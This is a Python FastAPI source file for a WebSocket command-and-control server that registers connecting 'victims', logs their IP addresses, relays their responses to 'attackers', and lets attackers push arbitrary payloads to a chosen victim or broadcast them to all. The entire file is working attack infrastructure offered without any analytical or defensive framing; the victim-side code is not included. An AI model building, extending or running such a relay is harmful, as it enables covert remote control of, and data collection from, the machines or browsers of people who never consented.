from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.staticfiles import StaticFiles

app = FastAPI()
app.mount("/static", StaticFiles(directory="static"), name="static")

victims = {}         # victim_id -> WebSocket
attackers = []       # list of attacker WebSockets
victim_counter = 0   # incremental victim ID

@app.websocket("/ws")
async def websocket_endpoint(ws: WebSocket):
    global victim_counter
    await ws.accept()
    role = await ws.receive_text()

    if role == "victim":
        victim_counter += 1
        victim_id = f"victim-{victim_counter}"
        victims[victim_id] = ws
        ip = ws.client.host
        print(f"[+] Victim connected: {victim_id} ({ip})")

        for atk in attackers:
            await atk.send_text(f"[🟢] Victim connected: {victim_id} ({ip})")

        try:
            while True:
                response = await ws.receive_text()
                print(f"[🚨 From {victim_id}] {response}")
                for atk in attackers:
                    await atk.send_text(f"[{victim_id}] {response}")
        except WebSocketDisconnect:
            del victims[victim_id]
            print(f"[-] Victim disconnected: {victim_id}")
            for atk in attackers:
                await atk.send_text(f"[🔴] Victim disconnected: {victim_id}")

    elif role == "attacker":
        attackers.append(ws)
        print(f"[+] Attacker connected: {ws.client.host}")

        # Send existing victims to this new attacker
        for victim_id, victim_ws in victims.items():
            ip = victim_ws.client.host
            await ws.send_text(f"[🟢] Victim connected: {victim_id} ({ip})")

        try:
            while True:
                command = await ws.receive_text()

                if command.startswith("to:"):
                    # Format: to:victim-1|<payload>
                    parts = command.split("|", 1)
                    victim_tag = parts[0][3:]
                    payload = parts[1]

                    if victim_tag in victims:
                        await victims[victim_tag].send_text(payload)
                    else:
                        await ws.send_text(f"[❌] Victim {victim_tag} not found")
                else:
                    # broadcast to all victims
                    for victim_ws in victims.values():
                        await victim_ws.send_text(command)

        except WebSocketDisconnect:
            attackers.remove(ws)
            print(f"[-] Attacker disconnected: {ws.client.host}")
